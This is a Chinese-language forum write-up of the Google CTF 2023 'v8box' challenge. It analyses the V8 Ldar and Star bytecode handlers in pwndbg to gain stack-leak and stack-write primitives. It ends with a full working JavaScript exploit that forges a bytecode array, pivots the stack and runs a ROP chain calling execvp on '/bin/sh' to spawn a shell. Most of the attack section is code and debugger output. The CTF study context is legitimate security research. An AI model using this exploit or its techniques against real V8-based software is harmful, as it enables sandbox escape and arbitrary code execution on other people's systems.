这里是 Ldar 指令对应的字节码

```
pwndbg> job 0x123e00195bbd
0x123e00195bbd: [BytecodeArray] in OldSpace
 - map: 0x123e00000979 Parameter count 3
Register count 0
Frame size 0
         0x123e00195bdc @    0 : 0b 04             Ldar a1
         0x123e00195bde @    2 : 38 03 00          Add a0, [0]
         0x123e00195be1 @    5 : 44 01 01          AddSmi [1], [1]
         0x123e00195be4 @    8 : aa                Return
Constant pool (size = 0)
Handler Table (size = 0)
Source Position Table (size = 0)
pwndbg> 
```

下面是 Ldar 指令对应的汇编，r12 寄存器是 bytecodearray 的基址，r9 是索引。可以不难看出这里的返回值 rac 由 rbx 赋值，rbx 是通过 rdx+rbx 索引得到，然后 rdx 由 rbp 赋值，也就是说这个指令会返回一个栈上的数值。

```
pwndbg> disassemble Builtins_LdarHandler
Dump of assembler code for function Builtins_LdarHandler:
   0x000061c54bbfb740 <+0>:  movsx  rbx,BYTE PTR [r12+r9*1+0x1]
   0x000061c54bbfb746 <+6>:  mov    rdx,rbp
   0x000061c54bbfb749 <+9>:  mov    rbx,QWORD PTR [rdx+rbx*8]
   0x000061c54bbfb74d <+13>:  add    r9,0x2
   0x000061c54bbfb751 <+17>:  movzx  edx,BYTE PTR [r9+r12*1]
   0x000061c54bbfb756 <+22>:  mov    rcx,QWORD PTR [r15+rdx*8]
   0x000061c54bbfb75a <+26>:  mov    rax,rbx
   0x000061c54bbfb75d <+29>:  jmp    rcx
   0x000061c54bbfb75f <+31>:  nop
End of assembler dump.
pwndbg>
```

通过 demo 可以看下这个的效果

```
ResetOffset();
EditBytecodeArray(0xb);
EditBytecodeArray(0x10);
EditBytecodeArray(0xaa);
 
stop()
var leak = h();
logg("leak",leak);
```

此时的指令执行情况

![](https://bbs.kanxue.com/upload/attach/202505/971428_TUMG5HSBCSF9N6H.png)

此时栈和 leak 的情况

![](https://bbs.kanxue.com/upload/attach/202505/971428_H84833U4KN2JBJ2.png)

由于指针压缩的存在，只能泄漏出低 32 位的值，同时由于类型是 smi，所以会对应的 >>1 ，这里`0x000000000fdb6c0e * 2 = 0x1fb6d81c`

下面是 Star 的汇编指令，与 Ldar 同理。这里将 rax，也就是上一次执行的返回值，赋给栈上。

```
pwndbg> disassemble Builtins_StarHandler
Dump of assembler code for function Builtins_StarHandler:
   0x000056c61fcb4d00 <+0>:  movsx  ebx,BYTE PTR [r12+r9*1+0x1]
   0x000056c61fcb4d06 <+6>:  mov    rdx,rbp
   0x000056c61fcb4d09 <+9>:  movsxd rbx,ebx
   0x000056c61fcb4d0c <+12>:  mov    QWORD PTR [rdx+rbx*8],rax
   0x000056c61fcb4d10 <+16>:  add    r9,0x2
   0x000056c61fcb4d14 <+20>:  movzx  ebx,BYTE PTR [r9+r12*1]
   0x000056c61fcb4d19 <+25>:  mov    rcx,QWORD PTR [r15+rbx*8]
   0x000056c61fcb4d1d <+29>:  jmp    rcx
   0x000056c61fcb4d1f <+31>:  nop
End of assembler dump.
```

执行了这一段代码

```
ResetOffset();
EditBytecodeArray(0xb);
EditBytecodeArray(0x10);
EditBytecodeArray(0x18);
EditBytecodeArray(0x0);
EditBytecodeArray(0xaa);
```

不难从下面看出，rbp+0x0 处的值被修改为 rax 寄存器内的值

```
───────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
 RAX  0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
 RBX  0
 RCX  0x6014eb712d00 (Builtins_StarHandler) ◂— movsx ebx, byte ptr [r12 + r9 + 1]
 RDX  0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
 RDI  0x255e00194d4d ◂— 0x190000021900182a
 RSI  0x255e00194c35 ◂— 0xe9000000060018ff
 R8   0x7ffc6cc67360 —▸ 0x255e00000251 ◂— 1
 R9   0x21
 R10  0xb
 R11  2
 R12  0x255e0019507d ◂— 0x1900000012000009 /* '\t' */
 R13  0x60151033d810 —▸ 0x255e00008ac9 ◂— 0x610000021900000d /* '\r' */
 R14  0x255e00000000 ◂— 0x29000
 R15  0x60151036b8d0 —▸ 0x6014eb712200 (Builtins_WideHandler) ◂— add r9, 1
 RBP  0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
 RSP  0x7ffc6cc67318 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
*RIP  0x6014eb712d10 (Builtins_StarHandler+16) ◂— add r9, 2
────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
   0x6014eb71275d jmp    rcx                         ↓
   0x6014eb712d00 movsx  ebx, byte ptr [r12 + r9 + 1]     EBX, [0x255e0019509f] => 0
   0x6014eb712d06 mov    rdx, rbp                         RDX => 0x7ffc6cc67348 —▸ 0x7ffc6cc673c0 —▸ 0x7ffc6cc673e8 —▸ 0x7ffc6cc67450 ◂— ...
   0x6014eb712d09 movsxd rbx, ebx                         RBX => 0
   0x6014eb712d0c mov    qword ptr [rdx + rbx*8], rax     [0x7ffc6cc67348] <= 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
 ► 0x6014eb712d10 add    r9, 2                            R9 => 35 (0x21 + 0x2)
   0x6014eb712d14 movzx  ebx, byte ptr [r9 + r12]         EBX, [0x255e001950a0] => 0xaa
   0x6014eb712d19 mov    rcx, qword ptr [r15 + rbx*8]     RCX, [0x60151036be20] => 0x6014eb7257c0 (Builtins_ReturnHandler) ◂— push rbp
   0x6014eb712d1d jmp    rcx                         ↓
   0x6014eb7257c0 push   rbp
   0x6014eb7257c1 mov    rbp, rsp     RBP => 0x7ffc6cc67310 —▸ 0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— ...
──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffc6cc67318 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
01:0008│-028     0x7ffc6cc67320 ◂— 0x3e /* '>' */
02:0010│-020     0x7ffc6cc67328 —▸ 0x255e0019507d ◂— 0x1900000012000009 /* '\t' */
03:0018│-018     0x7ffc6cc67330 ◂— 1
04:0020│-010     0x7ffc6cc67338 —▸ 0x255e00194d4d ◂— 0x190000021900182a
05:0028│-008     0x7ffc6cc67340 —▸ 0x255e00194c35 ◂— 0xe9000000060018ff
06:0030│ rdx rbp 0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
07:0038│+008     0x7ffc6cc67350 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x6014eb712d10 Builtins_StarHandler+16
   1   0x6014eb5cd927 Builtins_InterpreterEntryTrampoline+167
   2             0x3e None
   3   0x255e0019507d None
   4              0x1 None
   5   0x255e00194d4d None
   6   0x255e00194c35 None
   7   0x6014eb5cb81c Builtins_JSEntryTrampoline+92
───────────────────────────────────────────────────────────────────────────────────[ THREADS (16 TOTAL) ]────────────────────────────────────────────────────────────────────────────────────
  ► 1   "d8"              stopped: 0x6014eb712d10 2   "V8 DefaultWorke" stopped: 0x71e50ec91117 <__futex_abstimed_wait_cancelable64+231>
    3   "V8 DefaultWorke" stopped: 0x71e50ec91117 <__futex_abstimed_wait_cancelable64+231>
    4   "V8 DefaultWorke" stopped: 0x71e50ec91117 <__futex_abstimed_wait_cancelable64+231>
Not showing 12 thread(s). Use set context-max-threads to change this.
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> tele $rbp
00:0000│ rdx rbp 0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
01:0008│+008     0x7ffc6cc67350 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
02:0010│+010     0x7ffc6cc67358 —▸ 0x255e001822d9 ◂— 0x190004e39e001930
03:0018│ r8      0x7ffc6cc67360 —▸ 0x255e00000251 ◂— 1
04:0020│+020     0x7ffc6cc67368 —▸ 0x255e00000251 ◂— 1
05:0028│+028     0x7ffc6cc67370 —▸ 0x255e00194959 ◂— 3
06:0030│+030     0x7ffc6cc67378 ◂— 8
07:0038│+038     0x7ffc6cc67380 ◂— 0x154
pwndbg> 
```

利用思路
----

通过上面的分析，此时已经具备了泄漏栈上低 4 字节数据和栈上 8 字节数据写的原语。

首先需要解决的是如何控制 RIP，通过栈上 8 字节写的方法，其实已经可以控制 rbp 了，通过修改字节数组，可以多执行几次 leave，这样就可以实现栈迁移，其实这里就可以劫持控制流了。

那么如果获取 gadget，也就是泄漏 d8 的基地值呢，从栈上的值是可以发现一些位于 d8 的代码片段的。

```
pwndbg> tele $rbp
00:0000│ rdx rbp 0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
01:0008│+008     0x7ffc6cc67350 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
02:0010│+010     0x7ffc6cc67358 —▸ 0x255e001822d9 ◂— 0x190004e39e001930
03:0018│ r8      0x7ffc6cc67360 —▸ 0x255e00000251 ◂— 1
04:0020│+020     0x7ffc6cc67368 —▸ 0x255e00000251 ◂— 1
05:0028│+028     0x7ffc6cc67370 —▸ 0x255e00194959 ◂— 3
06:0030│+030     0x7ffc6cc67378 ◂— 8
07:0038│+038     0x7ffc6cc67380 ◂— 0x154
pwndbg> xinfo 0x6014eb5cb81c
Extended information for virtual address 0x6014eb5cb81c:
 
  Containing mapping:
    0x6014eadf0000     0x6014eb934000 r-xp   b44000 678000 d8
 
  Offset information:
         Mapped Area 0x6014eb5cb81c = 0x6014eadf0000 + 0x7db81c
         File (Base) 0x6014eb5cb81c = 0x6014ea777000 + 0xe5481c
      File (Segment) 0x6014eb5cb81c = 0x6014eadf0000 + 0x7db81c
         File (Disk) 0x6014eb5cb81c = /home/flyyy/Desktop/workspace/browser/v8/gctf23/v8/out.gn/x64.release/d8 + 0xe5381c
 
 Containing ELF sections:
               .text 0x6014eb5cb81c = 0x6014eadf0000 + 0x7db81c
pwndbg>
```

对于地址随机化，这里的低四位字节是变化很小 / 基本上不变化，那么现在就是需要泄漏 d8 基地址的高位字节。因为堆块开头部分还是具有读权限的，所以高位字节可以从堆块开头读到，然后拼接起来，再减去尾部的偏移，就可以拿到 d8 的基地值，拿到 d8 的基地值之后，就可以获取 gadget，通过这些 gadget 写 rop 提权

```
pwndbg> tele 0x15400040000 10
00:0000│  0x15400040000 ◂— 0x40000
01:0008│  0x15400040008 ◂— 0x12
02:0010│  0x15400040010 —▸ 0x5e26e0ce2278 ◂— 0x1000
03:0018│  0x15400040018 —▸ 0x15400042130 ◂— 0x600000089
04:0020│  0x15400040020 —▸ 0x15400080000 ◂— 0x40000
05:0028│  0x15400040028 ◂— 0x3ded0
06:0030│  0x15400040030 ◂— 0
07:0038│  0x15400040038 ◂— 0x2130 /* '0!' */
08:0040│  0x15400040040 —▸ 0x5e26e0d1a308 —▸ 0x5e26c6ac76e0 (vtable for v8::internal::SemiSpace+16) —▸ 0x5e26c5fd78e0 (v8::internal::__RT_impl_Runtime_GetSubstitution(v8::internal::Argumenr
09:0048│  0x15400040048 —▸ 0x5e26e0cd1700 —▸ 0x5e26c6ae8ac0 (vtable for v8::base::BoundedPageAllocator+16) —▸ 0x5e26c6910140 (v8::base::BoundedPageAllocator::~BoundedPageAllocator()) ◂— pur
pwndbg>
```

exp
===

```
function stop(){
    %SystemBreak();
}
 
function p(arg){
    %DebugPrint(arg);
}
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
function h(a,b){
    return a+b+1;
}
 
tag = 1;
var offset = 0x20
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 
function addressOf(obj){
    return Sandbox.getAddressOf(obj) | tag;
}
 
function getField(obj, offset) {
    return memory.getUint32((obj + offset)& (~tag), true);
}
 
function setField32(obj, offset, val){
    // logg("setField32 addr",obj+(offset));
    memory.setUint32(Number((obj + offset) & (~tag)), Number(val), true);
}
 
function setField64(obj, offset, val){
    let val_lo = val & 0xffffffffn;
    let val_hi = (val &  0xffffffff00000000n) >> 32n;
    // logg("setField64 addr",obj+(offset));
    // logg("val",val);
    // logg("val_lo",val_lo);
    // logg("val_hi",val_hi);
    setField32(obj,offset,val_lo);
    setField32(obj,offset+0x4,val_hi);
}
 
function getu64(hi, lo) {
    hi = BigInt(hi);
    lo = BigInt(lo);
    return (hi << 32n) + lo;
}
 
 
function EditBytecodeArray(val){
    // logg("edid addr",BigInt(bytecode_addr + offset) + sandbox_base);
    memory.setUint8((bytecode_addr + offset),val);
    ++offset;
}
 
function ResetOffset(){
    offset = 0x20;
}
 
function CopyByteCode(){
    for (let i = 0; i < bc_struct.length; ++i){
        memory.setUint8(Number(FakeBytecodeArrayAddr+BigInt(i)),bc_struct[i]);
    }
}
 
h();
 
var sandbox_base_hi = getField(0,0x4001c);
var sandbox_base_lo = getField(0,0x40020) - 0x80000;
var sandbox_base = getu64(sandbox_base_hi,sandbox_base_lo);
var d8_hi = getField(0,0x40014);
 
var shared_info = getField(addressOf(h),0xc);
var bytecode_addr = getField(shared_info,0x4) & (~tag);
 
logg("sandbox_base addr",sandbox_base);
logg("shared_info addr",BigInt(shared_info) + sandbox_base);
logg("bytecode_addr",BigInt(bytecode_addr) + sandbox_base);
 
// inst -> Ldr/Star + offset
// 0xb -> Ldr
// 0x18 -> Star
ResetOffset();
EditBytecodeArray(0xb);
EditBytecodeArray(0x10);
EditBytecodeArray(0xaa);
 
 
var d8_lo = h() * 2;
d8_lo = Number(d8_lo) >>> 0;
var d8_base = getu64(d8_hi,d8_lo) - 0xe5481cn;
 
// logg("d8_lo",d8_lo);
// logg("d8_hi",d8_hi);
logg("d8_base",d8_base);
 
/*
0x00000000007ab7e3 : pop rdi ; ret
0x00000000007f01da : pop rsi ; ret
0x0000000000755f1b : pop rdx ; ret
0x0000000000679058 : ret
0x11bb840 ---> d8 execvp@plt
*/
 
var execvp_plt = 0x11bb840n + d8_base;
var pop_rdi_ret = 0x00000000007ab7e3n + d8_base;
var pop_rsi_ret = 0x00000000007f01dan + d8_base;
var pop_rdx_ret = 0x0000000000755f1bn + d8_base;
var ret = 0x0000000000679058n + d8_base;
 
logg("execvp_plt",execvp_plt);
logg("pop_rdi_ret",pop_rdi_ret);
logg("pop_rsi_ret",pop_rsi_ret);
logg("pop_rdx_ret",pop_rdx_ret);
logg("ret",ret);
 
var FakeStack = new Array(0x1000).fill(0);
var FakeStackObjectAddr = addressOf(FakeStack);
var FakeStackAddr = getField(FakeStackObjectAddr,0x8) & (~tag);
var RopAddr = BigInt(FakeStackAddr)+sandbox_base+0x30n;
 
logg("FakeStackObjectAddr",FakeStackObjectAddr);
logg("FakeStackAddr",FakeStackAddr);
logg("RopAddr",RopAddr);
 
let binsh = 0x68732f6e69622fn;
var binsh_addr = BigInt(FakeStackAddr) + 0xa0n + sandbox_base;
 
var FakeBytecodeArray = new Array(0x1000);
var FakeBytecodeArrayAddr = BigInt(addressOf(FakeBytecodeArray) & (~tag)) + 0x20n;
logg("FakeBytecodeArrayAddr",FakeBytecodeArrayAddr);
 
var bc_struct = [
  0x79, 0x09, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00,
  0x19, 0x02, 0x00, 0x00, 0x61, 0x0f, 0x00, 0x00,
  0x51, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x0b, 0x03, 0x18, 0x00, 0xaa, 0x44, 0x01, 0x01,
  0xaa, 0x00, 0x00, 0x00, 0x29, 0x09, 0x00, 0x00,
  0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x10, 0x02, 0x00, 0x00, 0x99, 0x02, 0x00, 0x00,
  0x84, 0xe3, 0x82, 0x00, 0x04, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0xb5, 0x42, 0x19, 0x00,
  0xfe, 0xff, 0xff, 0xff, 0x51, 0x02, 0x00, 0x00,
  0x1c, 0x04, 0x00, 0x00, 0xb4, 0x04, 0x00, 0x00,
  0xc9, 0x45, 0x19, 0x00, 0x89, 0x00, 0x00, 0x00,
  0x06, 0x00, 0x00, 0x00, 0x69, 0x42, 0x19, 0x00,
  0x49, 0x7a, 0x02, 0x00, 0x59, 0x42, 0x19, 0x00,
  0x79, 0x09, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00
];
 
CopyByteCode();
 
setField64(FakeStackObjectAddr,-0x20,(FakeBytecodeArrayAddr+sandbox_base+0x1n)<<8n);
setField32(FakeStackObjectAddr,-0x19,0n);
setField32(FakeStackObjectAddr,-0x28,0x4600n);
setField32(FakeStackObjectAddr,-0x24,0x0n);
 
// rop
setField64(FakeStackAddr,0xa0, binsh);
 
setField32(FakeStackObjectAddr,0x4,0x0n);
setField64(FakeStackObjectAddr,0x8,ret<<8n);
setField64(FakeStackObjectAddr,0x10,0x0n);
 
setField64(FakeStackAddr,0x38, (pop_rdi_ret));
setField64(FakeStackAddr,0x40, (binsh_addr));
setField64(FakeStackAddr,0x48, (pop_rsi_ret));
setField64(FakeStackAddr,0x50, (0n));
setField64(FakeStackAddr,0x58, (pop_rdx_ret));
setField64(FakeStackAddr,0x60, (0n));
setField64(FakeStackAddr,0x68, (execvp_plt));
 
ResetOffset();
EditBytecodeArray(0xb);
EditBytecodeArray(0x3);
EditBytecodeArray(0x18);
EditBytecodeArray(0x0);
EditBytecodeArray(0xaa);
 
h(FakeStack);
```

![](https://bbs.kanxue.com/upload/attach/202505/971428_7SSTD66UPNGGU9H.png)

参考链接
====

[https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution](elink@7a8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3V1k6Y4L8$3!0Y4L8r3g2Q4x3X3c8U0N6r3k6Q4x3V1k6@1M7X3g2W2i4K6u0r3L8h3q4A6L8W2)9J5c8U0t1H3x3U0y4Q4x3V1k6I4N6h3q4D9M7#2)9J5c8Y4y4S2L8X3c8T1L8%4S2Q4x3X3c8$3z5r3u0G2P5q4)9J5c8Y4y4G2L8s2g2@1K9h3!0F1)

[[注意] 看雪招聘，专注安全领域的专业人才平台！](https://job.kanxue.com/)

[#漏洞机制](forum-171-1-181.htm) [#浏览器相关](forum-171-1-184.htm)